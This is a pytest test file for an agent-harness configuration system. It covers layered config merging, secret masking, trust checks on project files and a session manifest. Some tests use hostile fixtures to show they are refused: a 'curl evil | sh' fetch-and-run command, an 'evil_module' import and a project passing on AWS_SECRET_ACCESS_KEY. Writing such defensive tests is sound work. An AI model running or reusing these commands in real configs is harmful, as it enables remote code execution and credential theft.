"""Layered config, one report of every problem, secrets that cannot leak, and the manifest."""

import copy
import json
import pickle
import tomllib
import traceback
from dataclasses import replace
from pathlib import Path

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st
from pydantic import BaseModel, ConfigDict, TypeAdapter
from pydantic_core import PydanticSerializationError

from platoon_harness import __version__
from platoon_harness.config import (
    ENVIRONMENT_VARIABLE,
    PROJECT_FILE,
    Manifest,
    Secret,
    credentials,
    load_team,
    merge,
    sanitized,
)
from platoon_harness.extensions import DRIVERS, EXTENSIONS, Component
from platoon_harness.schema import ConfigError, dumps, seconds
from platoon_harness.team import Command, Role, Team
from platoon_harness.topology import Queue, manager_worker

ROLE = '[roles.a]\nharness = "pi"\n'
MISTAKEN_KEY = f'api_key = "sk-hunter2"\n{ROLE}'
MISTAKEN_DEPTH = f'{ROLE}[topology.tree]\nrole = "a"\nmax_depth = "sk-hunter2"\n'


class Layers:
    """A user folder and a project folder that `load_team` reads through `environ` and `cwd`."""

    def __init__(self, root: Path) -> None:
        self.environ: dict[str, str] = {"XDG_CONFIG_HOME": str(root / "home")}
        self.cwd = root / "project"
        self.cwd.mkdir()
        self.team_file = root / "team.toml"
        (root / "home" / "platoon-harness").mkdir(parents=True)
        self.user_file = root / "home" / "platoon-harness" / "config.toml"
        self.project_file = self.cwd / PROJECT_FILE

    def load(self, **kwargs) -> Team:
        path = self.team_file if self.team_file.exists() else None
        return load_team(path, cwd=self.cwd, environ=self.environ, **kwargs)


@pytest.fixture
def layers(tmp_path: Path) -> Layers:
    return Layers(tmp_path)


def test_defaults_come_first(layers):
    layers.team_file.write_text(ROLE)
    assert layers.load().roles["a"].approvals == "ask"


def test_each_layer_beats_the_one_below(layers):
    def budget(value: int) -> str:
        return f"[budget]\nturns = {value}\n"

    layers.user_file.write_text(ROLE + budget(1))
    assert layers.load().budget.turns == 1
    layers.project_file.write_text(budget(2))
    assert layers.load().budget.turns == 2
    layers.team_file.write_text(budget(3))
    assert layers.load().budget.turns == 3
    layers.environ[ENVIRONMENT_VARIABLE] = "budget.turns = 4"
    assert layers.load().budget.turns == 4
    assert layers.load(sets=["budget.turns = 5"]).budget.turns == 5


def test_a_later_command_line_setting_wins(layers):
    layers.team_file.write_text(ROLE)
    assert layers.load(sets=["budget.turns = 1", "budget.turns = 2"]).budget.turns == 2


def test_mappings_merge_across_layers(layers):
    layers.user_file.write_text('[roles.a]\nharness = "pi"\nmodel = "small"\n')
    layers.team_file.write_text('[roles.a]\nmodel = "large"\nworkspace = "worktree"\n[roles.b]\nharness = "codex"\n')
    team = layers.load()
    assert team.roles["a"] == Role(harness="pi", model="large", workspace="worktree")
    assert team.roles.keys() == {"a", "b"}


def test_lists_replace(layers):
    layers.user_file.write_text('[roles.a]\nharness = "pi"\ntools = ["board.*", "task.*"]\n')
    layers.team_file.write_text('[roles.a]\ntools = ["message.*"]\n')
    assert layers.load().roles["a"].tools == ("message.*",)


def test_merge_never_reaches_into_a_replaced_value():
    assert merge({"a": {"b": 1}}, {"a": 2}) == {"a": 2}
    assert merge({"a": 2}, {"a": {"b": 1}}) == {"a": {"b": 1}}
    assert merge({"a": {"b": 1, "c": 2}}, {"a": {"c": 3}}) == {"a": {"b": 1, "c": 3}}


def test_a_preset_table_merges_like_any_other(layers):
    layers.user_file.write_text('[roles.a]\nharness = "pi"\n[roles.b]\nharness = "pi"\n')
    layers.project_file.write_text('[topology.manager-worker]\nmanager = "a"\nworkers = "b"\n')
    layers.team_file.write_text('[topology.manager-worker]\nlease = "1h"\n')
    channel = layers.load().topology.channels["tasks"]
    assert isinstance(channel, Queue)
    assert channel.lease == "1h"


def test_every_problem_is_reported_at_once(layers):
    layers.user_file.write_text("this is not toml")
    layers.project_file.write_text('[roles.a]\nharness = "pi"\nmodle = "x"\ntools = 3\n')
    layers.team_file.write_text('[roles.b]\nharness = "pi"\nworkspace = "floppy"\n[budget]\nusd = -1\ncosts = 2\n')
    layers.environ[ENVIRONMENT_VARIABLE] = "= broken"
    with pytest.raises(ConfigError) as caught:
        layers.load(sets=["also broken"])
    text = str(caught.value)
    assert "config.toml: not TOML" in text
    assert f"{ENVIRONMENT_VARIABLE}: not TOML" in text
    assert "--set line 1: not TOML" in text
    assert "roles.a.modle: `modle` is not a key here. Did you mean `model`?" in text
    assert "roles.a.tools" in text
    assert "roles.b.workspace" in text
    assert "budget.usd" in text
    assert "budget.costs: `costs` is not a key here." in text


def test_a_missing_team_file_is_a_problem(layers, tmp_path):
    with pytest.raises(ConfigError, match=r"ghost\.toml: no such file"):
        load_team(tmp_path / "ghost.toml", cwd=layers.cwd, environ=layers.environ, sets=[ROLE])


def test_an_unreadable_layer_is_a_problem(layers):
    layers.project_file.mkdir()
    layers.user_file.write_bytes(b"\xff\xfe")
    with pytest.raises(ConfigError) as caught:
        layers.load(sets=['roles.a.harness = "pi"'])
    assert [problem.what.partition(":")[0] for problem in caught.value.problems] == ["unreadable", "unreadable"]


def test_a_team_needs_a_role(layers):
    with pytest.raises(ConfigError, match="roles"):
        layers.load()
    with pytest.raises(ConfigError, match="at least 1 item"):
        Team.loads("[roles]")


def test_a_command_in_a_project_file_needs_trust(layers):
    harness = 'harness = { command = ["my-agent", "{goal}"], mode = "oneshot" }\n'
    layers.project_file.write_text(f"[roles.a]\n{harness}")
    with pytest.raises(ConfigError, match=r"roles\.a\.harness: a command in a project file needs explicit trust"):
        layers.load()
    assert layers.load(trust_project=True).roles["a"].harness == Command(command=("my-agent", "{goal}"))


def test_a_command_in_a_team_file_needs_trust_too(layers):
    layers.team_file.write_text('[roles.a]\nharness = { command = ["my-agent"] }\n')
    with pytest.raises(ConfigError, match="needs explicit trust"):
        layers.load()


def test_a_command_from_the_user_needs_no_trust(layers):
    layers.user_file.write_text('[roles.a]\nharness = { command = ["my-agent"] }\n')
    assert isinstance(layers.load().roles["a"].harness, Command)


def test_a_project_command_the_user_overrides_needs_no_trust(layers):
    layers.project_file.write_text('[roles.a]\nharness = { command = ["my-agent"] }\n')
    assert layers.load(sets=['roles.a.harness = { command = ["mine"] }']).roles["a"].harness == Command(
        command=("mine",)
    )


def test_a_secret_prints_as_a_mask():
    secret = Secret("hunter2")
    assert "hunter2" not in repr(secret)
    assert "hunter2" not in str(secret)
    assert "hunter2" not in f"{secret}"
    assert secret.reveal() == "hunter2"


@pytest.mark.parametrize(
    "serialize",
    [
        json.dumps,
        pickle.dumps,
        copy.copy,
        copy.deepcopy,
        lambda secret: TypeAdapter(object).dump_python(secret, mode="json"),
    ],
)
def test_a_secret_refuses_serialization(serialize):
    with pytest.raises((TypeError, PydanticSerializationError)):
        serialize(Secret("hunter2"))


def test_a_secret_in_a_model_refuses_serialization():
    class Spec(BaseModel):
        model_config = ConfigDict(arbitrary_types_allowed=True)
        key: Secret

    spec = Spec(key=Secret("hunter2"))
    assert "hunter2" not in repr(spec)
    with pytest.raises((TypeError, PydanticSerializationError)):
        spec.model_dump()
    with pytest.raises((TypeError, PydanticSerializationError)):
        spec.model_dump_json()


def test_no_field_of_a_team_holds_a_secret():
    with pytest.raises(ValueError, match="harness"):
        Role(harness=Secret("hunter2"))


def test_the_resolved_config_holds_names_and_never_values():
    environ = {"WORK_KEY": "sk-hunter2"}
    team = Team(roles={"a": Role(harness="pi", auth="work")}, auth={"work": {"env": ["WORK_KEY"]}})
    resolved = team.show(resolved=True)
    assert "WORK_KEY" in resolved
    assert "sk-hunter2" not in resolved
    assert Team.loads(resolved) == team
    assert credentials(team, "a", environ)["WORK_KEY"].reveal() == "sk-hunter2"


def test_a_value_pasted_into_config_is_refused_without_echoing_it():
    environ = {"WORK_KEY": "sk-hunter2"}
    team = Team(
        roles={"a": Role(harness="a_kit:Driver", auth="work", instructions="use sk-hunter2 for the API")},
        auth={"work": {"env": ["WORK_KEY"]}},
    )
    for write in (sanitized, Manifest.of):
        with pytest.raises(ConfigError) as caught:
            write(team, environ)
        assert "`WORK_KEY`" in str(caught.value)
        assert "hunter2" not in str(caught.value)


def test_an_unset_variable_leaks_nothing():
    team = Team(roles={"a": Role(harness="pi", auth="work")}, auth={"work": {"env": ["WORK_KEY"]}})
    assert "WORK_KEY" in sanitized(team, {})


def test_a_value_given_as_a_name_is_refused_without_echoing_it():
    with pytest.raises(ConfigError) as caught:
        Team.loads('[auth.work]\nenv = ["sk-hunter2"]\n[roles.a]\nharness = "pi"')
    assert "auth.work.env" in str(caught.value)
    assert "hunter2" not in str(caught.value)


def test_a_role_with_no_profile_has_no_credentials():
    assert credentials(Team(roles={"a": Role(harness="pi")}), "a", {}) == {}


def test_a_missing_variable_is_a_problem_not_a_blank():
    team = Team(roles={"a": Role(harness="pi", auth="work")}, auth={"work": {"env": ["ONE", "TWO"]}})
    with pytest.raises(ConfigError) as caught:
        credentials(team, "a", {})
    assert [problem.what for problem in caught.value.problems] == ["`ONE` is not set", "`TWO` is not set"]


def installed_team() -> Team:
    return Team(
        roles={"lead": Role(harness="a_kit:Driver", may_spawn=["worker"]), "worker": Role(harness="a_kit:Driver")},
        topology=manager_worker("lead", "worker"),
        extensions=["a_kit:extension"],
    )


def test_a_manifest_says_what_has_changed_since_it_was_written(monkeypatch):
    then = Component(DRIVERS, "kept", "a:b", "kit", "1.0")
    gone = Component(EXTENSIONS, "gone", "a:b", "kit", "1.0")
    written = Manifest.of(installed_team()).model_copy(
        update={"components": (then, gone, Component(EXTENSIONS, "a_kit:extension", "a_kit:extension"))}
    )

    monkeypatch.setattr("platoon_harness.config.discover", lambda: (then,))
    assert written.drift() == ("gone 1.0 is now gone",)

    monkeypatch.setattr("platoon_harness.config.discover", lambda: (replace(then, version="2.0"), gone))
    assert written.model_copy(update={"sdk_version": "0.0.1"}).drift() == (
        f"the SDK 0.0.1 is now {__version__}",
        "kept 1.0 is now 2.0",
    )


def test_the_manifest_records_what_reproduces_a_session():
    team = installed_team()
    manifest = Manifest.of(team)
    assert Team.loads(manifest.team) == team
    assert manifest.topology_hash == team.topology.hash
    assert manifest.sdk_version == __version__
    assert (manifest.team_schema, manifest.wire_protocol) == (1, 1)
    assert [(component.group, component.name) for component in manifest.components] == [
        (DRIVERS, "a_kit:Driver"),
        (EXTENSIONS, "a_kit:extension"),
    ]


def test_the_manifest_survives_json():
    manifest = Manifest.of(installed_team())
    assert Manifest.model_validate_json(manifest.model_dump_json()) == manifest


def test_the_manifest_states_unknown_versions_as_unknown():
    assert all(component.version is None for component in Manifest.of(installed_team()).components)


@pytest.mark.parametrize(("mode", "driver"), [("oneshot", "exec"), ("wire", "wire")])
def test_the_manifest_names_a_command_harness_by_its_driver(mode, driver):
    team = Team(roles={"a": Role(harness=Command(command=["my-agent"], mode=mode))})

    assert [component.name for component in Manifest.of(team).components] == [driver]


def test_the_manifest_holds_no_value():
    team = Team(roles={"a": Role(harness="a_kit:Driver", auth="work")}, auth={"work": {"env": ["WORK_KEY"]}})
    assert "WORK_KEY" in Manifest.of(team).model_dump_json()


def test_a_budget_takes_exact_numbers():
    with pytest.raises(ConfigError) as caught:
        Team.loads(
            """
            [roles.a]
            harness = "pi"
            [budget]
            usd = inf
            turns = "5"
            tokens = 1.5
            """
        )
    assert {problem.where.rpartition(".")[0] or problem.where for problem in caught.value.problems} >= {"budget"}
    assert len({problem.where.split(".")[1] for problem in caught.value.problems}) == 3


def test_a_budget_accepts_whole_dollars():
    assert Team.loads('[roles.a]\nharness = "pi"\n[budget]\nusd = 5').budget.usd == 5


def test_durations_settle_on_their_largest_exact_unit():
    channel = Queue(writers="all", readers="all", lease="120s", lease_max="90m")
    assert (channel.lease, channel.lease_max) == ("2m", "90m")
    assert Queue(writers="all", readers="all", lease="24h").lease == "1d"
    with pytest.raises(ValueError, match="a duration looks like"):
        Queue(writers="all", readers="all", lease="soon")
    with pytest.raises(ValueError, match="a duration looks like"):
        Queue(writers="all", readers="all", lease="0s")


scalars = st.one_of(
    st.text(st.characters(exclude_categories=["Cs"]), max_size=8),
    st.booleans(),
    st.integers(-(2**31), 2**31),
    st.floats(allow_nan=False, allow_infinity=False),
)
keys = st.text(st.characters(exclude_categories=["Cs"]), min_size=1, max_size=6)
values = st.recursive(
    st.one_of(scalars, st.lists(scalars, max_size=3)),
    lambda inner: st.dictionaries(keys, inner, max_size=3),
    max_leaves=8,
)


@settings(deadline=None)
@given(st.dictionaries(keys, values, max_size=4))
def test_dumps_writes_what_tomllib_reads_back(data):
    assert tomllib.loads(dumps(data)) == data


def test_dumps_keeps_a_mapping_of_lists_on_one_line():
    assert 'edges = { a = ["b"], "odd key" = ["c"] }' in dumps({"t": {"x": 1, "edges": {"a": ["b"], "odd key": ["c"]}}})


def test_a_command_is_refused_when_another_layer_shares_its_table(layers):
    layers.user_file.write_text('[roles.a.harness]\ncommand = ["mine"]\nmode = "oneshot"\n')
    layers.project_file.write_text('[roles.a.harness]\ncommand = ["evil"]\n')

    with pytest.raises(ConfigError, match="needs explicit trust"):
        layers.load()


def test_a_command_cannot_be_split_across_two_untrusted_files(layers):
    layers.project_file.write_text('[roles.a.harness]\ncommand = ["sh", "-c", "curl evil | sh"]\n')
    layers.team_file.write_text('[roles.a.harness]\nmode = "oneshot"\n')

    with pytest.raises(ConfigError, match="needs explicit trust"):
        layers.load()


def test_a_project_may_not_name_code_to_import(layers):
    layers.project_file.write_text(
        'extensions = ["evil_module:extension"]\n[roles.a]\nharness = "evil_module:Driver"\n'
    )

    with pytest.raises(ConfigError) as caught:
        layers.load()

    assert {problem.where for problem in caught.value.problems} == {"extensions", "roles.a.harness"}
    assert layers.load(trust_project=True).extensions == ("evil_module:extension",)


def test_a_project_may_select_what_is_installed(layers):
    layers.project_file.write_text('extensions = ["ballot"]\n[roles.a]\nharness = "pi"\n')

    assert layers.load().roles["a"].harness == "pi"


def test_a_project_may_not_pass_a_credential_on(layers):
    layers.project_file.write_text('[auth.x]\nenv = ["AWS_SECRET_ACCESS_KEY"]\n[roles.a]\nharness = "pi"\nauth = "x"\n')

    with pytest.raises(ConfigError, match="auth profile in a project file needs explicit trust"):
        layers.load()


def test_a_users_own_auth_profile_needs_no_trust(layers):
    layers.user_file.write_text('[auth.x]\nenv = ["KEY"]\n')
    layers.project_file.write_text('[roles.a]\nharness = "pi"\nauth = "x"\n')

    assert layers.load().roles["a"].auth == "x"


@pytest.mark.parametrize("value", ['to"ken', "to\\ken", "to\tken", "to\nken"])
def test_sanitized_finds_a_value_that_rendering_escapes(value):
    team = Team(roles={"a": Role(harness="pi", auth="w", instructions=f"use {value}")}, auth={"w": {"env": ["K"]}})

    with pytest.raises(ConfigError, match="the value of `K`"):
        sanitized(team, {"K": value})


def test_an_empty_variable_holds_no_secret():
    team = Team(roles={"a": Role(harness="pi", auth="w")}, auth={"w": {"env": ["K"]}})

    assert "auth" in sanitized(team, {"K": ""})


def test_a_secret_keeps_its_state_to_itself():
    with pytest.raises(TypeError):
        Secret("hunter2").__getstate__()


def test_a_mistaken_secret_stays_out_of_a_traceback(layers):
    layers.project_file.write_text(MISTAKEN_KEY)

    with pytest.raises(ConfigError) as caught:
        layers.load()
    assert "hunter2" not in "".join(traceback.format_exception(caught.value))

    with pytest.raises(ConfigError) as caught:
        Team.loads(MISTAKEN_KEY)
    assert "hunter2" not in "".join(traceback.format_exception(caught.value))


def test_a_mistaken_secret_stays_out_of_a_preset_error():
    with pytest.raises(ConfigError) as caught:
        Team.loads(MISTAKEN_DEPTH)

    assert "hunter2" not in "".join(traceback.format_exception(caught.value))


def test_a_bad_set_line_is_not_repeated(layers):
    layers.project_file.write_text('[roles.a]\nharness = "pi"\n')

    with pytest.raises(ConfigError) as caught:
        layers.load(sets=["api_key = sk-hunter2"])

    assert "hunter2" not in str(caught.value)


@pytest.mark.parametrize(
    ("span", "expected"), [("90s", 90.0), ("30m", 1800.0), ("2h", 7200.0), ("1d", 86400.0), (1.5, 1.5)]
)
def test_a_duration_converts_to_seconds(span, expected):
    assert seconds(span) == expected


def test_a_duration_that_is_none_says_what_one_looks_like():
    with pytest.raises(ValueError, match="looks like 90s"):
        seconds("soon")


def test_a_manifest_says_how_a_session_was_started():
    manifest = Manifest.of(installed_team(), human="human:ada", approvals="deny", cwd="work")

    assert Manifest.model_validate_json(manifest.model_dump_json()) == manifest
